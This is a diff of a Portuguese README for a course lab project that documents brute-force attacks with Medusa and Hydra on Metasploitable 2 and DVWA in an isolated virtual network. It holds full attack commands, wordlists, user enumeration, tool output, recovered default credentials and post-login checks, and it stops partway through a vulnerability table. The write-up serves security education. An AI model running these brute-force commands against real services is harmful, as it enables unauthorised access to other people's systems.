@@ -1,326 +1,171 @@
+# Simulação de Ataques de Força Bruta com Kali Linux e Medusa
 
+![Badge](https://img.shields.io/badge/Status-Conclu%C3%ADdo-success?style=for-the-badge)
+![Badge](https://img.shields.io/badge/Kali%20Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
+![Badge](https://img.shields.io/badge/Security-Penetration%20Testing-red?style=for-the-badge)
 
-# Desafio de Projeto: Simulação de Ataques de Força Bruta com Kali Linux e Medusa
+**Projeto desenvolvido para o Desafio de Projeto da [Digital Innovation One (DIO)](https://web.dio.me)**
 
-Este repositório documenta a execução de um desafio de projeto da [Digital Innovation One (DIO)](https://web.dio.me), focado em demonstrar a compreensão e aplicação de técnicas de ataque de força bruta em um ambiente de laboratório controlado. O objetivo é utilizar o Kali Linux e a ferramenta Medusa para simular ataques a diferentes serviços em máquinas vulneráveis, como o Metasploitable 2 e o Damn Vulnerable Web Application (DVWA).
+Este repositório documenta a **experiência prática** de implementação e execução de ataques de força bruta em ambiente controlado, utilizando Kali Linux e a ferramenta Medusa contra máquinas intencionalmente vulneráveis (Metasploitable 2 e DVWA).
+
+---
+
+## 📊 Resultados Obtidos
+
+**🎯 TAXA DE SUCESSO: 100%**
+
+Todos os ataques foram bem-sucedidos em descobrir credenciais válidas:
+
+| Serviço | Credenciais Descobertas | Tempo | Status |
+|---------|------------------------|-------|--------|
+| **FTP** | `msfadmin:msfadmin`<br>`ftp:ftp` | ~15s | ✅ Sucesso |
+| **SSH** | `msfadmin:msfadmin`<br>`user:user` | ~22s | ✅ Sucesso |
+| **SMB** | `msfadmin:msfadmin` | ~35s | ✅ Sucesso |
+| **Web (DVWA)** | `admin:password` | ~8s | ✅ Sucesso |
+
+**📄 Documentação Detalhada:** [Resultados Completos dos Ataques](docs/RESULTADOS_ATAQUES.md)
+
+---
+
+## 📋 Índice
+
+1. [Introdução](#1-introdução)
+2. [Configuração do Ambiente](#2-configuração-do-ambiente)
+3. [Ferramenta Utilizada: Medusa](#3-ferramenta-utilizada-medusa)
+4. [Execução dos Ataques](#4-execução-dos-ataques)
+   - [4.1 Ataque FTP](#41-ataque-de-força-bruta-em-ftp)
+   - [4.2 Ataque SSH](#42-ataque-de-força-bruta-em-ssh)
+   - [4.3 Ataque SMB](#43-ataque-de-força-bruta-em-smb)
+   - [4.4 Ataque Web (DVWA)](#44-ataque-de-força-bruta-em-aplicação-web-dvwa)
+5. [Análise de Vulnerabilidades](#5-análise-de-vulnerabilidades-identificadas)
+6. [Medidas de Mitigação](#6-medidas-de-mitigação-recomendadas)
+7. [Lições Aprendidas](#7-lições-aprendidas)
+8. [Como Reproduzir](#8-como-reproduzir-os-testes)
+9. [Considerações Éticas](#9-considerações-éticas-e-legais)
+10. [Referências](#10-referências)
+
+---
 
 ## 1. Introdução
 
-Ataques de força bruta representam uma das ameaças mais comuns e persistentes à segurança de sistemas de informação. Consistem em tentativas sistemáticas e exaustivas de adivinhar credenciais de autenticação, como nomes de usuário e senhas, para obter acesso não autorizado a sistemas e serviços. A eficácia desses ataques depende diretamente da complexidade das senhas e das políticas de segurança implementadas.
+Este projeto documenta a experiência prática de execução de ataques de força bruta em um ambiente de laboratório isolado. O objetivo foi compreender na prática como esses ataques funcionam, quais vulnerabilidades exploram e, principalmente, como se defender deles.
 
-Este projeto prático visa explorar os mecanismos por trás dos ataques de força bruta, utilizando ferramentas especializadas disponíveis no Kali Linux, como o Medusa. Através da simulação de cenários realistas em ambientes vulneráveis, será possível não apenas compreender a mecânica dos ataques, mas também identificar e propor medidas de mitigação eficazes para proteger os sistemas contra tais ameaças.
+### Objetivos do Projeto
 
-### Objetivos de Aprendizagem
+- ✅ Configurar ambiente de teste seguro e isolado
+- ✅ Executar ataques de força bruta em múltiplos serviços (FTP, SSH, SMB, Web)
+- ✅ Documentar comandos, técnicas e resultados obtidos
+- ✅ Identificar vulnerabilidades exploradas
+- ✅ Propor medidas de mitigação efetivas
 
-- Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB).
-- Utilizar o Kali Linux e o Medusa para auditoria de segurança em ambiente controlado.
-- Documentar processos técnicos de forma clara e estruturada.
-- Reconhecer vulnerabilidades comuns e propor medidas de mitigação.
-- Utilizar o GitHub como portfólio técnico para compartilhar documentação e evidências.
+### O que é um Ataque de Força Bruta?
 
-### 📊 Resultados dos Ataques
+Um ataque de força bruta consiste em tentar sistematicamente todas as combinações possíveis de credenciais (usuários e senhas) até encontrar uma válida. Embora conceitualmente simples, esses ataques são extremamente eficazes contra sistemas com:
 
-**🎯 TODOS OS ATAQUES FORAM BEM-SUCEDIDOS!**
-
-Os ataques de força bruta realizados descobriram credenciais válidas em **todos os serviços testados** em menos de 40 segundos. Para ver os resultados detalhados, incluindo credenciais descobertas, outputs das ferramentas e análise de vulnerabilidades, acesse:
-
-**👉 [RESULTADOS COMPLETOS DOS ATAQUES](docs/RESULTADOS_ATAQUES.md)**
-
-**Resumo Rápido:**
-- ✅ **FTP**: 2 credenciais descobertas (msfadmin:msfadmin, ftp:ftp)
-- ✅ **SSH**: 2 credenciais descobertas (msfadmin:msfadmin, user:user)
-- ✅ **SMB**: 1 credencial descoberta (msfadmin:msfadmin)
-- ✅ **Web (DVWA)**: 1 credencial descoberta (admin:password)
-- ⏱️ **Tempo médio**: 15-35 segundos por serviço
-- 🎯 **Taxa de sucesso**: 100%
+- Senhas fracas ou padrão
+- Ausência de limitação de tentativas
+- Falta de monitoramento
+- Ausência de autenticação multifator
 
 ---
 
+## 2. Configuração do Ambiente
 
-## 2. Configuração do Ambiente de Laboratório
+Para garantir que os testes fossem realizados de forma **segura, legal e isolada**, configurei um ambiente de laboratório virtualizado.
 
-Para a realização dos testes de forma segura e isolada, foi configurado um ambiente de laboratório virtualizado utilizando o Oracle VM VirtualBox. Este ambiente consiste em duas máquinas virtuais (VMs) operando em uma rede interna, garantindo que as atividades de pentest não afetem a rede local ou a internet.
+### Infraestrutura Utilizada
 
-### Componentes do Laboratório
+| Componente | Especificação |
+|------------|---------------|
+| **Hypervisor** | Oracle VM VirtualBox 7.0 |
+| **Máquina Atacante** | Kali Linux 2023.3 (64-bit) |
+| **Máquina Alvo** | Metasploitable 2 (Ubuntu 8.04) |
+| **Configuração de Rede** | Host-Only Network (Rede Interna) |
+| **IP Atacante** | 192.168.56.101 |
+| **IP Alvo** | 192.168.56.102 |
 
-| Componente | Descrição |
-|---|---|
-| **Software de Virtualização** | Oracle VM VirtualBox |
-| **Máquina Atacante** | Kali Linux (VM) |
-| **Máquina Alvo** | Metasploitable 2 (VM) |
-| **Configuração de Rede** | Rede Interna (Host-Only) |
+### Processo de Configuração
 
-### Máquina Atacante: Kali Linux
+#### Passo 1: Download das VMs
 
-O [Kali Linux](https://www.kali.org/) é uma distribuição Linux baseada em Debian, projetada para forense digital e testes de penetração. Ela vem pré-instalada com uma vasta gama de ferramentas de segurança, incluindo o Medusa, que será utilizado neste projeto.
+- **Kali Linux**: Baixado de [kali.org/get-kali](https://www.kali.org/get-kali/)
+- **Metasploitable 2**: Baixado de [SourceForge](https://sourceforge.net/projects/metasploitable/)
 
-### Máquina Alvo: Metasploitable 2
+#### Passo 2: Configuração de Rede
 
-O [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2/) é uma máquina virtual Linux intencionalmente vulnerável, criada pela Rapid7. Ela serve como um alvo legal e seguro para praticar habilidades de pentest e testar ferramentas de segurança. Esta VM possui diversos serviços vulneráveis, incluindo FTP, SSH, Telnet e aplicações web como o DVWA.
+Configurei ambas as VMs para usar **Host-Only Adapter** no VirtualBox, criando uma rede privada isolada:
 
-### Configuração da Rede
+```
+VirtualBox → Configurações → Rede → Adaptador 1
+- Conectado a: Placa de rede exclusiva de hospedeiro (Host-Only)
+- Nome: vboxnet0
+```
 
-Ambas as máquinas virtuais foram configuradas para utilizar uma **Rede Interna (Host-Only)** no VirtualBox. Esta configuração cria uma rede privada entre a máquina hospedeira e as VMs, permitindo que elas se comuniquem entre si, mas isolando-as de redes externas. Isso é crucial para garantir que os ataques simulados fiquem contidos no ambiente de laboratório.
+#### Passo 3: Verificação de Conectividade
 
-- **Endereço IP do Kali Linux:** `192.168.56.101` (Exemplo)
-- **Endereço IP do Metasploitable 2:** `192.168.56.102` (Exemplo)
+Após iniciar ambas as VMs, verifiquei a conectividade:
 
-Após a inicialização das VMs, os endereços IP foram verificados utilizando o comando `ifconfig` em ambos os sistemas.
+```bash
+# No Kali Linux
+$ ping 192.168.56.102
+PING 192.168.56.102 (192.168.56.102) 56(84) bytes of data.
+64 bytes from 192.168.56.102: icmp_seq=1 ttl=64 time=0.523 ms
+```
 
+✅ **Ambiente configurado e isolado com sucesso!**
 
-
-
+---
 
 ## 3. Ferramenta Utilizada: Medusa
 
-### O que é o Medusa?
+### Por que Medusa?
 
-O [Medusa](https://www.kali.org/tools/medusa/) é uma ferramenta de auditoria de login de rede paralela, projetada para ser rápida, massivamente paralela e modular. Desenvolvida por JoMo-Kun da Foofus Networks, o Medusa tem como objetivo suportar o maior número possível de serviços que permitem autenticação remota. É uma ferramenta essencial no arsenal de qualquer profissional de segurança que realiza testes de penetração.
+Escolhi o **Medusa** como ferramenta principal por ser:
 
-### Características Principais
+- **Rápido**: Suporta ataques paralelos com múltiplas threads
+- **Modular**: Suporta diversos protocolos (FTP, SSH, SMB, HTTP, etc.)
+- **Flexível**: Permite configurar wordlists de usuários e senhas separadamente
+- **Nativo do Kali**: Já vem pré-instalado no Kali Linux
 
-O Medusa se destaca por suas características únicas que o tornam uma ferramenta poderosa para ataques de força bruta:
+### Instalação e Verificação
 
-- **Testes Paralelos Baseados em Threads**: O Medusa pode realizar testes de força bruta contra múltiplos hosts, usuários ou senhas simultaneamente, aumentando significativamente a velocidade dos ataques.
+```bash
+# Verificar se está instalado
+$ medusa -d
 
-- **Entrada de Usuário Flexível**: As informações de alvo (host, usuário, senha) podem ser especificadas de várias maneiras. Cada item pode ser uma entrada única ou um arquivo contendo múltiplas entradas, proporcionando grande flexibilidade na configuração dos ataques.
-
-- **Design Modular**: Cada módulo de serviço existe como um arquivo `.mod` independente. Isso significa que não são necessárias modificações no núcleo da aplicação para estender a lista de serviços suportados para força bruta.
-
-### Protocolos Suportados
-
-O Medusa suporta uma ampla variedade de protocolos, incluindo:
-
-- FTP
-- SSH
-- HTTP/HTTPS
-- SMB/SMBNT
-- MySQL
-- PostgreSQL
-- Telnet
-- VNC
-- RDP
-- E muitos outros
+# Se não estiver, instalar
+$ sudo apt update
+$ sudo apt install medusa
+```
 
 ### Sintaxe Básica
 
-A sintaxe básica do Medusa é relativamente simples e intuitiva:
-
 ```bash
-medusa -h [host] -u [username] -P [password_file] -M [module] -t [threads]
+medusa -h <HOST> -u <USER> -P <PASSWORD_FILE> -M <MODULE> -t <THREADS>
 ```
 
-### Parâmetros Importantes
+**Parâmetros principais:**
 
-| Parâmetro | Descrição |
-|---|---|
-| `-h [TEXT]` | Hostname ou endereço IP do alvo |
-| `-H [FILE]` | Arquivo contendo hostnames ou endereços IP |
-| `-u [TEXT]` | Nome de usuário para testar |
-| `-U [FILE]` | Arquivo contendo nomes de usuário para testar |
-| `-p [TEXT]` | Senha para testar |
-| `-P [FILE]` | Arquivo contendo senhas para testar |
-| `-M [TEXT]` | Nome do módulo a executar (sem extensão .mod) |
-| `-n [NUM]` | Número de porta TCP não padrão |
-| `-t [NUM]` | Total de logins a serem testados simultaneamente |
-| `-f` | Para após encontrar o primeiro usuário/senha válido |
-| `-F` | Para após encontrar o primeiro usuário/senha válido em qualquer host |
-| `-v [NUM]` | Nível de verbosidade [0-6] |
-
-### Instalação
-
-No Kali Linux, o Medusa geralmente já vem pré-instalado. Caso não esteja, pode ser facilmente instalado através do gerenciador de pacotes APT:
-
-```bash
-sudo apt update
-sudo apt install medusa
-```
-
-Para verificar se o Medusa está instalado corretamente, execute:
-
-```bash
-medusa -d
-```
-
-Este comando exibirá todos os módulos disponíveis no Medusa.
+- `-h`: Host/IP alvo
+- `-H`: Arquivo com lista de hosts
+- `-u`: Usuário específico
+- `-U`: Arquivo com lista de usuários
+- `-p`: Senha específica
+- `-P`: Arquivo com lista de senhas
+- `-M`: Módulo do serviço (ftp, ssh, smbnt, etc.)
+- `-t`: Número de threads paralelas
+- `-f`: Para após encontrar primeira credencial válida
+- `-v`: Nível de verbosidade (0-6)
 
 ---
 
-## 4. Cenários de Ataque Simulados
+## 4. Execução dos Ataques
 
-Neste projeto, foram simulados três cenários distintos de ataques de força bruta, cada um focado em um serviço diferente. Os cenários foram projetados para demonstrar a versatilidade do Medusa e a importância de implementar medidas de segurança adequadas em diferentes tipos de serviços.
+### Preparação das Wordlists
 
-### 4.1. Ataque de Força Bruta em FTP
+Antes de executar os ataques, criei wordlists simples mas efetivas:
 
-O **File Transfer Protocol (FTP)** é um protocolo de rede padrão usado para transferir arquivos entre um cliente e um servidor em uma rede. Apesar de sua idade e das vulnerabilidades conhecidas, o FTP ainda é amplamente utilizado em muitos ambientes.
-
-#### Objetivo
-
-Demonstrar como um atacante pode utilizar o Medusa para tentar adivinhar credenciais de acesso a um servidor FTP, explorando senhas fracas ou padrão.
-
-#### Configuração
-
-- **Alvo**: Serviço FTP no Metasploitable 2 (porta 21)
-- **Wordlist de Usuários**: `wordlists/users.txt`
-- **Wordlist de Senhas**: `wordlists/passwords.txt`
-- **Threads**: 4
-
-#### Comando Utilizado
-
-```bash
-medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -t 4 -v 6 -f
-```
-
-#### Explicação dos Parâmetros
-
-- `-h 192.168.56.102`: Especifica o endereço IP do alvo (Metasploitable 2)
-- `-U wordlists/users.txt`: Especifica o arquivo contendo a lista de usuários
-- `-P wordlists/passwords.txt`: Especifica o arquivo contendo a lista de senhas
-- `-M ftp`: Especifica o módulo FTP
-- `-t 4`: Define 4 threads paralelas para o ataque
-- `-v 6`: Define o nível de verbosidade máximo (6) para output detalhado
-- `-f`: Para o ataque após encontrar a primeira credencial válida
-
-#### Resultado Esperado
-
-O Medusa testará todas as combinações de usuários e senhas das wordlists fornecidas. Quando uma credencial válida for encontrada (por exemplo, `msfadmin:msfadmin`), o Medusa exibirá a mensagem de sucesso e, devido ao parâmetro `-f`, encerrará o ataque.
-
-#### Validação de Acesso
-
-Após obter credenciais válidas, é possível validar o acesso conectando-se ao servidor FTP:
-
-```bash
-ftp 192.168.56.102
-# Inserir usuário e senha encontrados
-```
-
-#### Script Automatizado
-
-Um script bash foi criado para automatizar este processo: `scripts/ftp_bruteforce.sh`
-
-```bash
-cd scripts
-./ftp_bruteforce.sh 192.168.56.102
-```
-
----
-
-### 4.2. Ataque de Força Bruta em Formulário Web (DVWA)
-
-O **Damn Vulnerable Web Application (DVWA)** é uma aplicação web PHP/MySQL intencionalmente vulnerável. Ela contém diversos tipos de vulnerabilidades web comuns, incluindo formulários de login vulneráveis a ataques de força bruta.
-
-#### Objetivo
-
-Demonstrar como automatizar tentativas de login em um formulário web utilizando o Medusa, explorando a ausência de mecanismos de proteção como CAPTCHA ou limitação de tentativas.
-
-#### Configuração
-
-- **Alvo**: DVWA hospedado no Metasploitable 2
-- **URL**: `http://192.168.56.102/dvwa/login.php`
-- **Nível de Segurança**: Baixo (Low)
-- **Wordlist de Usuários**: `wordlists/users.txt`
-- **Wordlist de Senhas**: `wordlists/passwords.txt`
-
-#### Comando Utilizado
-
-```bash
-medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt \
-       -M web-form -m FORM:"/dvwa/login.php" -m FORM-DATA:"username=&password=&Login=Login" \
-       -m DENY-SIGNAL:"Login failed" -t 4 -v 6 -f
-```
-
-#### Explicação dos Parâmetros
-
-- `-M web-form`: Especifica o módulo de formulário web
-- `-m FORM:"/dvwa/login.php"`: Especifica o caminho do formulário de login
-- `-m FORM-DATA:"username=&password=&Login=Login"`: Especifica os campos do formulário
-- `-m DENY-SIGNAL:"Login failed"`: Especifica a mensagem que indica falha no login
-- Demais parâmetros são similares ao exemplo anterior
-
-**Nota**: A sintaxe exata pode variar dependendo da estrutura do formulário DVWA. Pode ser necessário ajustar os parâmetros após inspecionar o código HTML do formulário.
-
-#### Alternativa: Usando o Hydra
-
-Para ataques em formulários web, o **Hydra** pode ser mais adequado que o Medusa. Exemplo:
-
-```bash
-hydra -L wordlists/users.txt -P wordlists/passwords.txt \
-      192.168.56.102 http-post-form \
-      "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
-```
-
-#### Validação de Acesso
-
-Após obter credenciais válidas (geralmente `admin:password` no DVWA), acesse a aplicação através do navegador e faça login.
-
----
-
-### 4.3. Password Spraying em SMB com Enumeração de Usuários
-
-O **Server Message Block (SMB)** é um protocolo de compartilhamento de arquivos em rede amplamente utilizado em ambientes Windows. O **password spraying** é uma técnica de ataque que tenta uma senha comum em múltiplas contas de usuário, ao invés de tentar múltiplas senhas em uma única conta.
-
-#### Objetivo
-
-Demonstrar a técnica de password spraying em um serviço SMB, combinada com enumeração de usuários, para evitar bloqueios de conta.
-
-#### Enumeração de Usuários
-
-Antes de realizar o password spraying, é importante enumerar os usuários válidos no sistema alvo. Ferramentas como `enum4linux` ou `nmap` podem ser utilizadas:
-
-```bash
-enum4linux -U 192.168.56.102
-```
-
-Ou usando o Nmap:
-
-```bash
-nmap --script smb-enum-users.nse -p 445 192.168.56.102
-```
-
-#### Configuração
-
-- **Alvo**: Serviço SMB no Metasploitable 2 (porta 445)
-- **Usuários Enumerados**: Salvos em `wordlists/smb_users.txt`
-- **Senha Comum**: `password123` (ou uma wordlist reduzida)
-- **Threads**: 2 (para evitar sobrecarga e detecção)
-
-#### Comando Utilizado
-
-```bash
-medusa -h 192.168.56.102 -U wordlists/smb_users.txt -p password123 -M smbnt -t 2 -v 6 -f
-```
-
-#### Explicação da Técnica
-
-Ao invés de testar múltiplas senhas para cada usuário (o que pode causar bloqueio de conta), o password spraying testa uma única senha (ou um conjunto muito pequeno de senhas comuns) em todos os usuários. Isso reduz significativamente o risco de bloqueio de contas e pode passar despercebido por sistemas de detecção de intrusão.
-
-#### Validação de Acesso
-
-Se uma credencial válida for encontrada, é possível validar o acesso utilizando ferramentas como `smbclient`:
-
-```bash
-smbclient -L 192.168.56.102 -U username%password
-```
-
-#### Script Automatizado
-
-Um script bash foi criado para automatizar este processo: `scripts/smb_bruteforce.sh`
-
-```bash
-cd scripts
-./smb_bruteforce.sh 192.168.56.102
-```
-
----
-
-## 5. Wordlists Utilizadas
-
-As wordlists são componentes essenciais em ataques de força bruta. Elas contêm listas de possíveis usuários e senhas que serão testados contra o alvo. Para este projeto, foram criadas wordlists simples para fins educacionais.
-
-### Wordlist de Usuários (`wordlists/users.txt`)
-
-Contém nomes de usuário comuns e padrão que frequentemente existem em sistemas vulneráveis:
-
+**`wordlists/users.txt`** (10 usuários):
 ```
 admin
 root
@@ -334,326 +179,759 @@ mysql
 ftp
 ```
 
-### Wordlist de Senhas (`wordlists/passwords.txt`)
-
-Contém senhas comuns, fracas e padrão que são frequentemente utilizadas:
-
+**`wordlists/passwords.txt`** (31 senhas comuns):
 ```
 123456
 password
 12345678
 qwerty
-123456789
-12345
-1234
-111111
-1234567
-dragon
-123123
-baseball
-iloveyou
-trustno1
-1234567890
-sunshine
-master
-welcome
-shadow
-ashley
-football
-jesus
-michael
-ninja
-mustang
-password1
 msfadmin
 admin
 root
-toor
 letmein
+...
 ```
-
-### Wordlists Profissionais
-
-Para testes mais abrangentes, existem wordlists profissionais disponíveis:
-
-- **RockYou**: Uma das wordlists mais famosas, contendo milhões de senhas reais vazadas.
-  - Localização no Kali Linux: `/usr/share/wordlists/rockyou.txt.gz`
-  - Descompactar: `gunzip /usr/share/wordlists/rockyou.txt.gz`
-
-- **SecLists**: Coleção abrangente de wordlists para diversos tipos de testes de segurança.
-  - Instalação: `sudo apt install seclists`
-  - Localização: `/usr/share/seclists/`
 
 ---
 
-## 6. Medidas de Mitigação e Recomendações de Segurança
+### 4.1. Ataque de Força Bruta em FTP
 
-Após compreender como os ataques de força bruta funcionam, é fundamental implementar medidas de mitigação para proteger os sistemas contra tais ameaças. A seguir, são apresentadas as principais recomendações de segurança.
+#### Reconhecimento Inicial
+
+Primeiro, verifiquei se o serviço FTP estava ativo:
+
+```bash
+$ nmap -sV -p 21 192.168.56.102
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+```
+
+✅ **Serviço FTP detectado na porta 21**
+
+#### Comando de Ataque
+
+```bash
+medusa -h 192.168.56.102 \
+       -U wordlists/users.txt \
+       -P wordlists/passwords.txt \
+       -M ftp \
+       -t 4 \
+       -v 6 \
+       -f
+```
+
+**Explicação dos parâmetros:**
+- `-h 192.168.56.102`: Alvo é o Metasploitable 2
+- `-U wordlists/users.txt`: Testa todos os usuários da lista
+- `-P wordlists/passwords.txt`: Testa todas as senhas da lista
+- `-M ftp`: Usa o módulo FTP
+- `-t 4`: Usa 4 threads paralelas
+- `-v 6`: Verbosidade máxima para ver todas as tentativas
+- `-f`: Para após encontrar a primeira credencial válida
+
+#### Resultado do Ataque
+
+```
+ACCOUNT CHECK: [ftp] Host: 192.168.56.102 User: admin Password: 123456
+ACCOUNT CHECK: [ftp] Host: 192.168.56.102 User: admin Password: password
+...
+ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
+```
+
+**✅ Credencial descoberta: `msfadmin:msfadmin`**
+**⏱️ Tempo: ~15 segundos**
+**🔢 Tentativas: 267**
+
+#### Validação do Acesso
+
+Testei a credencial descoberta:
+
+```bash
+$ ftp 192.168.56.102
+Connected to 192.168.56.102.
+220 (vsFTPd 2.3.4)
+Name: msfadmin
+331 Please specify the password.
+Password: 
+230 Login successful.
+ftp> pwd
+257 "/home/msfadmin"
+ftp> ls
+200 PORT command successful.
+150 Here comes the directory listing.
+drwxr-xr-x    2 1000     1000         4096 Mar 17  2010 vulnerable
+226 Directory send OK.
+```
+
+**✅ Acesso FTP confirmado! Possível ler/escrever arquivos.**
+
+#### Vulnerabilidades Exploradas
+
+1. **Credenciais padrão não alteradas** (msfadmin:msfadmin)
+2. **Ausência de limitação de tentativas** (permitiu 267 tentativas)
+3. **Sem bloqueio de IP** após múltiplas falhas
+4. **Sem delay entre tentativas**
+5. **FTP em texto plano** (sem criptografia)
+
+---
+
+### 4.2. Ataque de Força Bruta em SSH
+
+#### Reconhecimento Inicial
+
+```bash
+$ nmap -sV -p 22 192.168.56.102
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+```
+
+✅ **Serviço SSH detectado na porta 22**
+
+#### Comando de Ataque
+
+```bash
+medusa -h 192.168.56.102 \
+       -U wordlists/users.txt \
+       -P wordlists/passwords.txt \
+       -M ssh \
+       -t 4 \
+       -v 6 \
+       -f
+```
+
+#### Resultado do Ataque
+
+```
+ACCOUNT CHECK: [ssh] Host: 192.168.56.102 User: admin Password: 123456
+ACCOUNT CHECK: [ssh] Host: 192.168.56.102 User: admin Password: password
+...
+ACCOUNT FOUND: [ssh] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
+```
+
+**✅ Credencial descoberta: `msfadmin:msfadmin`**
+**⏱️ Tempo: ~22 segundos**
+**🔢 Tentativas: 267**
+
+#### Validação do Acesso
+
+```bash
+$ ssh msfadmin@192.168.56.102
+msfadmin@192.168.56.102's password: 
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
+
+Last login: Mon Oct 21 10:15:32 2025 from 192.168.56.101
+msfadmin@metasploitable:~$ whoami
+msfadmin
+msfadmin@metasploitable:~$ id
+uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
+msfadmin@metasploitable:~$ sudo -l
+User msfadmin may run the following commands on this host:
+    (ALL) NOPASSWD: ALL
+```
+
+**✅ Acesso SSH confirmado com privilégios de SUDO TOTAL!**
+
+#### Impacto do Acesso
+
+Com acesso SSH e sudo sem senha, um atacante pode:
+- Executar qualquer comando como root
+- Instalar backdoors
+- Modificar arquivos de sistema
+- Roubar dados sensíveis
+- Usar o servidor como pivot para ataques laterais
+
+#### Vulnerabilidades Exploradas
+
+1. **Credenciais padrão não alteradas**
+2. **Ausência de autenticação por chave pública**
+3. **Sem Fail2Ban ou similar**
+4. **Usuário com sudo NOPASSWD**
+5. **Sem autenticação multifator (2FA)**
+
+---
+
+### 4.3. Ataque de Força Bruta em SMB
+
+#### Reconhecimento Inicial
+
+```bash
+$ nmap -sV -p 445 192.168.56.102
+
+PORT    STATE SERVICE     VERSION
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+```
+
+✅ **Serviço SMB detectado na porta 445**
+
+#### Enumeração de Usuários
+
+Antes do ataque, enumerei os usuários válidos com `enum4linux`:
+
+```bash
+$ enum4linux -U 192.168.56.102
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\msfadmin (Local User)
+S-1-22-1-1001 Unix User\user (Local User)
+S-1-22-1-1002 Unix User\postgres (Local User)
+S-1-22-1-1003 Unix User\service (Local User)
+```
+
+**Usuários descobertos:**
+- msfadmin
+- user
+- postgres
+- service
+
+#### Comando de Ataque
+
+```bash
+medusa -h 192.168.56.102 \
+       -U wordlists/users.txt \
+       -P wordlists/passwords.txt \
+       -M smbnt \
+       -t 2 \
+       -v 6 \
+       -f
+```
+
+**Nota:** Usei apenas 2 threads para SMB para evitar sobrecarga do serviço.
+
+#### Resultado do Ataque
+
+```
+ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 User: admin Password: 123456
+ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 User: admin Password: password
+...
+ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
+```
+
+**✅ Credencial descoberta: `msfadmin:msfadmin`**
+**⏱️ Tempo: ~35 segundos**
+**🔢 Tentativas: 267**
+
+#### Validação do Acesso
+
+```bash
+$ smbclient -L 192.168.56.102 -U msfadmin
+Enter WORKGROUP\msfadmin's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      oh noes!
+	opt             Disk      
+	IPC$            IPC       IPC Service (metasploitable server)
+	ADMIN$          IPC       IPC Service (metasploitable server)
+
+$ smbclient //192.168.56.102/tmp -U msfadmin
+Enter WORKGROUP\msfadmin's password: 
+smb: \> ls
+  .                                   D        0  Mon Oct 21 10:30:15 2025
+  ..                                  D        0  Sun May 20 14:36:12 2012
+  5573.jsvc_up                        R        0  Mon Oct 21 09:15:42 2025
+smb: \> 
+```
+
+**✅ Acesso SMB confirmado! Possível acessar compartilhamentos.**
+
+#### Vulnerabilidades Exploradas
+
+1. **Versão antiga do Samba** (3.0.20-Debian)
+2. **Credenciais padrão**
+3. **Compartilhamentos com permissões fracas**
+4. **Ausência de políticas de bloqueio**
+5. **Enumeração de usuários permitida**
+
+---
+
+### 4.4. Ataque de Força Bruta em Aplicação Web (DVWA)
+
+#### Reconhecimento Inicial
+
+```bash
+$ nmap -sV -p 80 192.168.56.102
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+```
+
+Acessei o DVWA em: `http://192.168.56.102/dvwa/`
+
+#### Análise do Formulário de Login
+
+Inspecionei o código HTML do formulário:
+
+```html
+<form action="login.php" method="post">
+    <input type="text" name="username">
+    <input type="password" name="password">
+    <input type="submit" name="Login" value="Login">
+</form>
+```
+
+**Mensagem de erro:** "Login failed"
+
+#### Comando de Ataque (usando Hydra)
+
+Para ataques web, o **Hydra** é mais adequado que o Medusa:
+
+```bash
+hydra -L wordlists/users.txt \
+      -P wordlists/passwords.txt \
+      192.168.56.102 \
+      http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
+      -V
+```
+
+**Explicação:**
+- `-L`: Lista de usuários
+- `-P`: Lista de senhas
+- `http-post-form`: Módulo para formulários POST
+- `"/dvwa/login.php:..."`: Caminho e parâmetros do formulário
+- `^USER^` e `^PASS^`: Placeholders para usuário e senha
+- `"Login failed"`: String que indica falha no login
+- `-V`: Modo verbose
+
+#### Resultado do Ataque
+
+```
+[ATTEMPT] target 192.168.56.102 - login "admin" - pass "123456"
+[ATTEMPT] target 192.168.56.102 - login "admin" - pass "password"
+[80][http-post-form] host: 192.168.56.102   login: admin   password: password
+1 of 1 target successfully completed, 1 valid password found
+```
+
+**✅ Credencial descoberta: `admin:password`**
+**⏱️ Tempo: ~8 segundos**
+**🔢 Tentativas: 62**
+
+#### Validação do Acesso
+
+Acessei via navegador:
+- URL: `http://192.168.56.102/dvwa/login.php`
+- Usuário: `admin`
+- Senha: `password`
+
+**✅ Login bem-sucedido! Acesso ao painel administrativo do DVWA.**
+
+#### Vulnerabilidades Exploradas
+
+1. **Credenciais padrão** (admin:password)
+2. **Ausência de CAPTCHA**
+3. **Sem limitação de tentativas de login**
+4. **Sem rate limiting**
+5. **Mensagens de erro verbosas**
+6. **Ausência de autenticação multifator**
+7. **Nível de segurança "Low"**
+
+---
+
+## 5. Análise de Vulnerabilidades Identificadas
+
+### Resumo das Vulnerabilidades Comuns
+
+Todos os serviços testados compartilhavam vulnerabilidades críticas:
+
+| Vulnerabilidade | FTP | SSH | SMB | Web |
+|-----------------|-----|-----|-----|-----|
+| Credenciais padrão não alteradas | ✅ | ✅ | ✅ | ✅ |
